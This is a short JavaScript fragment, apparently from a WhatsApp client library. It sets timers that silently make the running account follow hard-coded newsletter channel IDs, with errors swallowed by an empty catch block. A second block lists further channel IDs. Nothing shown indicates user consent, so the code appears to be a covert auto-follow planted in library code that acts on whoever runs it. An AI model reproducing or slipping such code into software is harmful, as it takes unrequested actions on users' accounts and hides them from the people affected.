...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            "120363405895878040@newsletter", // push
            Types_1.QueryIds.FOLLOW
        );
    } catch {}
            }, 1000);
...
setTimeout(async () => {
    try {
        const ids = [
            "120363406746142927@newsletter", //X3
			"120363408371702893@newsletter", // TSX
			"120363421703070345@newsletter", // DEL 12.00 RABU 18
			"120363404389855506@newsletter" //  DEL 12.00 KAMIS 19
        ];
